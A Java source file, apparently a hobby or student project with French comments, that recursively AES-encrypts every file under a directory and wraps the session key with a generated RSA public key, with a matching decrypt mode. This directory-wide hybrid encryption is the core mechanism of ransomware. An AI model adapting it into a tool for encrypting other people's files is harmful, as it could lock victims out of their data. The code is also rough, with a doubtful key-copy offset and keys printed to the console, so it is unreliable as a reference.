import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.spec.InvalidKeySpecException;
import java.util.stream.Stream;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import AESCrypto.AESCrypto;
import RSACrypto.RSAKeyPairGenerator;

import java.io.FileNotFoundException;

public class Crypter {
	
	//private PrivateKey privateKey = null;
	//private PublicKey publicKey = null;
	
	public Crypter(String[] _args) throws InvalidKeyException, NoSuchPaddingException, FileNotFoundException, IllegalBlockSizeException, BadPaddingException, IOException, InvalidKeySpecException, NoSuchAlgorithmException {
		
		if(_args[1].equals("rsa")){
			RSAKeyPairGenerator rkpg = new RSACrypto.RSAKeyPairGenerator();
			rkpg.writeToFile("./keys.pub", rkpg.getPublicKey().getEncoded());
			rkpg.writeToFile("./keys.priv", rkpg.getPrivateKey().getEncoded());
		}else {
			byte[][] aesKeyAndIV = AESCrypto.generateAESKey();
			recursiveListDir(_args, aesKeyAndIV);
		}
	}
	
	public void recursiveListDir(String[] _args, byte[][] _aesKeyAndIV) {
		Stream<Path> streamPath = null;
		try {
			streamPath = Files.find(Paths.get(_args[0]),
			           Integer.MAX_VALUE,
			           (filePath, fileAttr) -> fileAttr.isRegularFile());
			streamPath.forEach(item->{
				System.out.println(item);
				if(_args[1].equals("crypter")) {
					try {
						cryptFile(item.toString(), _aesKeyAndIV);
					} catch (InvalidKeyException | NoSuchAlgorithmException | NoSuchPaddingException
							| IllegalBlockSizeException | BadPaddingException | InvalidKeySpecException
							| InvalidAlgorithmParameterException | IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
				if(_args[1].equals("decrypter")) {
					try {
						decryptFile(item.toString());
					} catch (InvalidKeyException | NoSuchAlgorithmException | NoSuchPaddingException
							| InvalidKeySpecException | IllegalBlockSizeException | BadPaddingException
							| InvalidAlgorithmParameterException | IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			});
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	/*
	public void recursiveCryptDir() {
		byte[] bytes = Files.readAllBytes(Paths.get(pubKeyFile));
		X509EncodedKeySpec ks = new X509EncodedKeySpec(bytes);
		KeyFactory kf = KeyFactory.getInstance("RSA");
		PublicKey pub = kf.generatePublic(ks);
	}
	public void recursiveDecryptDir() {
		
	}*/
	
	//ajout de ma part pour essayer de crypter les bytes des fichiers
	/*public void recursiveCryptFile(PrivateKey _pvt, String _inFile, String _encFile) throws NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, FileNotFoundException, IOException, IllegalBlockSizeException, BadPaddingException {
		PrivateKey pvt = _pvt;
	    Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
	    cipher.init(Cipher.ENCRYPT_MODE, pvt);
	    try (FileInputStream in = new FileInputStream(_inFile);
	         FileOutputStream out = new FileOutputStream(_encFile)) {
	        processFile(cipher, in, out);
	    }
	}
	
	static private void processFile(Cipher ci,FileInputStream in,FileOutputStream out)
		    throws javax.crypto.IllegalBlockSizeException,
		           javax.crypto.BadPaddingException,
		           java.io.IOException
		{
		    byte[] ibuf = new byte[1024];
		    int len;
		    while ((len = in.read(ibuf)) != -1) {
		        byte[] obuf = ci.update(ibuf, 0, len);
		        if ( obuf != null ) out.write(obuf);
		    }
		    byte[] obuf = ci.doFinal();
		    if ( obuf != null ) out.write(obuf);
		}*/
	public  static void cryptFile(String  _path, byte[][] _aesKeyAndIV) throws NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException, IOException, InvalidKeySpecException, InvalidAlgorithmParameterException {
		AESCrypto a = new AESCrypto();
		//on genere une cle aes et un vecteur d'initialisation aleatoires
		//on recupere la cle RSA publique
		//TODO: changer le chemin
		PublicKey rsaPublicKey = a.getPublicKey("./keys.pub");
		//on sauvegarde la clé aes dans un fichier keys.enc
		byte[] keyAndIVConcat = new byte[_aesKeyAndIV[0].length + _aesKeyAndIV[1].length];
		System.arraycopy(_aesKeyAndIV[0], 0, keyAndIVConcat, 0, _aesKeyAndIV[0].length);
		System.arraycopy(_aesKeyAndIV[1], 0, keyAndIVConcat, _aesKeyAndIV[1].length, _aesKeyAndIV[1].length);
		a.saveAESKeyRSAEncrypted("./keys.enc", rsaPublicKey, keyAndIVConcat);
		//on crypte un fichier avec cette clé AES
		SecretKeySpec aesSKey = new SecretKeySpec(_aesKeyAndIV[0], "AES");
		IvParameterSpec ivSpec = new IvParameterSpec(_aesKeyAndIV[1]);
		a.AESEncryptFile(aesSKey, ivSpec, _path, _path+".enc");
	}
	public static void decryptFile(String _path) throws NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeySpecException, IOException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException, InvalidAlgorithmParameterException {
		//a partir du fichier keys.priv on va reconstituer le fichier original
		//on recupere la cle RSA privee
		AESCrypto b = new AESCrypto();
		//TODO: changer chemins
		PrivateKey rsaPrivateKey = b.getPrivateKey("./keys.priv");
		//on decrypte la cle aes rsa encrypted pour l'utiliser afin de 
		//dechiffrer le fichier
		SecretKeySpec aesKey=b.getAESKeyFromAESRSAEncrypted("./keys.enc", rsaPrivateKey);
		IvParameterSpec iv = b.getIVFromAESRSAEncrypted("./keys.enc", rsaPrivateKey);
		System.out.println("rsaPrivateKey:"+rsaPrivateKey.toString());
		System.out.println("aeskey:"+aesKey.toString());
		System.out.println("iv:"+iv.toString());
		String[] parts = _path.split("\\.");
		String part1="";
		if(parts.length>=1) {
			part1=parts[0];
		}
		if(parts.length>=2) {
			part1=part1+"."+parts[1];
		}
		b.AESDecryptFile(aesKey, iv, _path, part1);
	}
	
}
